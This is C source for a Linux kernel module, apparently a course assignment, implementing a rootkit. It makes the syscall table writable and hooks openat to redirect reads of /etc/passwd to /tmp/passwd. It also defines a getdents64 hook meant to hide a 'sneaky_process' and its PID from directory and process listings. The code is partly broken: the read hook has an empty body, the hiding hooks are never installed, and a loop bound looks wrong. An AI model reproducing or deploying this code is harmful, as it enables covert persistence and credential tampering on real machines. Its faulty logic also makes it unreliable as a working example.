#include <asm/cacheflush.h>
#include <asm/current.h>  // process information
#include <asm/page.h>
#include <asm/unistd.h>     // for system call constants
#include <linux/highmem.h>  // for changing page permissions
#include <linux/init.h>     // for entry/exit macros
#include <linux/kallsyms.h>
#include <linux/kernel.h>  // for printk and other kernel bits
#include <linux/module.h>  // for all modules
#include <linux/sched.h>
#include <linux/dirent.h>
//import for ssize_t
#include <linux/fs.h>

#define PREFIX "sneaky_process"

// This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr) {
    // ptr 是一个指向内核地址空间中的内存地址的指针
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long)ptr, &level);
    // if PTE is not writable, set it to writable
    if (pte->pte & ~_PAGE_RW) {
        pte->pte |= _PAGE_RW;
    }
    return 0;
}

int disable_page_rw(void *ptr) {
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long)ptr, &level);
    // change PTE to read-only
    pte->pte = pte->pte & ~_PAGE_RW;
    return 0;
}
/*
 * 系统调用表是一个存储内核中各个系统调用函数地址的表。
 * 这个项目的目的是修改系统调用表，以便将原始的 openat、getdents64 和 read 系统
 * 调用替换为新的、具有隐藏功能的版本。
 */
/* enable_page_rw和disable_page_rw分别在initialize_sneaky_module和exit_sneaky_module函数中被调用 */

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
/**
 * @brief sneaky_sys_openat is the new openat syscall
 * @param regs is the register
 * @return int
 */
asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
    // Implement the sneaky part here

    // regs->si saves the path of the file to be opened in openat syscall
    char *original_si = (char *)regs->si;
    // when command is accessing /etc/passwd through openat syscall
    if (strcmp(original_si, "/etc/passwd") == 0) {
        // replace /etc/passwd with /tmp/passwd using copy_to_user
        copy_to_user((char *)regs->si, "/tmp/passwd", strlen("/tmp/passwd") + 1);
    }
    return (*original_openat)(regs);
}

/* for #1 and #2: hide sneaky_process from ls, cd, find; hide /proc/sneaky_process_id and ps - a -u */

asmlinkage int (*original_getdents64)(struct pt_regs *regs);

static char * sneaky_pid = "";
module_param(sneaky_pid, charp, 0);

/**
 * @brief isSneakyProcess is a helper function to check if the process is sneaky_process
*/
bool isSneakyProcess(struct linux_dirent *dirent, char *sneaky_pid) {
	if (strcmp(dirent->d_name, sneaky_pid) == 0 || strcmp(dirent->d_name, PREFIX) == 0) {
		return true;
	}
	return false;
}

/**
 * sneaky version of getdents64 syscall, which reads directory entries from the
 * specified directory file descriptor,  and fills the directory entries it reads
 * into a buffer in user space. The sneaky version would ignore the snkeay_process
 */
asmlinkage int sneaky_getdents64(struct pt_regs *regs) {
	//call original getdents64, and save bytes 
	int length = (*original_getdents64)(regs);

	// get the start address of the linux_dirent struct
	struct linux_dirent *dirent = (struct linux_dirent *)regs->si;

	int offset = 0;

	if (isSneakyProcess(dirent, sneaky_pid)) {
		// if the first entry is sneaky_process, then skip it
		offset += dirent->d_reclen;
		// delete the sneaky_process from the buffer
		memmove(dirent, (char *)dirent + offset, length - dirent->d_reclen);
	} else {
		while (offset <= length) {
			struct linux_dirent *temp = (struct linux_dirent *)((char *)dirent + offset);
			if (isSneakyProcess(temp, sneaky_pid)) {
				// if the entry is sneaky_process, then skip it
				//offset += temp->d_reclen;
				// delete the sneaky_process from the buffer
				memmove((char *)temp, (char *)temp + temp->d_reclen, length - temp->d_reclen - offset);
				length -= temp->d_reclen;
			} else {
				offset += temp->d_reclen;
			}
		}
	}
	return length;
}


asmlinkage ssize_t (*original_read)(struct pt_regs *regs);


asmlinkage ssize_t sneaky_read(struct pt_regs *regs) {
	
}



// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
    // See /var/log/syslog or use `dmesg` for kernel print output
    printk(KERN_INFO "Sneaky module being loaded.\n");

    // Lookup the address for this symbol. Returns 0 if not found.
    // This address will change after rebooting due to protection
    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

    // This is the magic! Save away the original 'openat' system call
    // function address. Then overwrite its address in the system call
    // table with the function address of our new code.
    original_openat = (void *)sys_call_table[__NR_openat];

    // Turn off write protection mode for sys_call_table
    enable_page_rw((void *)sys_call_table);

    sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;

    // You need to replace other system calls you need to hack here

    // Turn write protection mode back on for sys_call_table
    disable_page_rw((void *)sys_call_table);

    return 0;  // to show a successful load
}

static void exit_sneaky_module(void) {
    printk(KERN_INFO "Sneaky module being unloaded.\n");

    // Turn off write protection mode for sys_call_table
    enable_page_rw((void *)sys_call_table);

    // This is more magic! Restore the original 'open' system call
    // function address. Will look like malicious code was never there!
    sys_call_table[__NR_openat] = (unsigned long)original_openat;

    // Turn write protection mode back on for sys_call_table
    disable_page_rw((void *)sys_call_table);
}

module_init(initialize_sneaky_module);  // what's called upon loading
module_exit(exit_sneaky_module);        // what's called upon unloading
MODULE_LICENSE("GPL");